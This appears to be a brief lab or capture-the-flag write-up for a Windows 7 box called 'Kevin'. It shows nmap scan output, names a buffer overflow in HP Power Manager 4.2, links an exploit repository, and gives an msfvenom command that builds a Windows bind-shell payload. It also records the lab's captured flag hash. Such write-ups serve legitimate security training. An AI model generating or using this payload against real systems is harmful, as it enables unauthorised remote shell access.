# Kevin \[Easy]

## Report

HP Power Manager on port 80 vulnerable to buffer overflow, exploit to become SYSTEM

## Enumeration

192.168.177.45

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        GoAhead WebServer
| http-methods: 
|_  Supported Methods: GET HEAD
| http-title: HP Power Manager
|_Requested resource was http://192.168.177.45/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  `�?!�U      Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
|_ssl-date: 2025-10-19T13:56:17+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2025-10-19T13:56:01+00:00
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49158/tcp open  msrpc       Microsoft Windows RPC
49160/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Files

None

### Initial Foothold

#### 80

HP Power Manager 4.2 (Build 7)

{% embed url="https://github.com/Muhammd/HP-Power-Manager.git" %}

## PrivEsc

follow payload format in script

`msfvenom -p windows/shell_bind_tcp LHOST=192.168.45.233 LPORT=1234 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python`

## Loot

### Creds

None

### Flags

8ee4b87656bcc8f2a44639d35c09d63a

## Proof

Keeping with the bof, not really there for us but hey doesn't hurt to do something that's not explicitly mentioned right
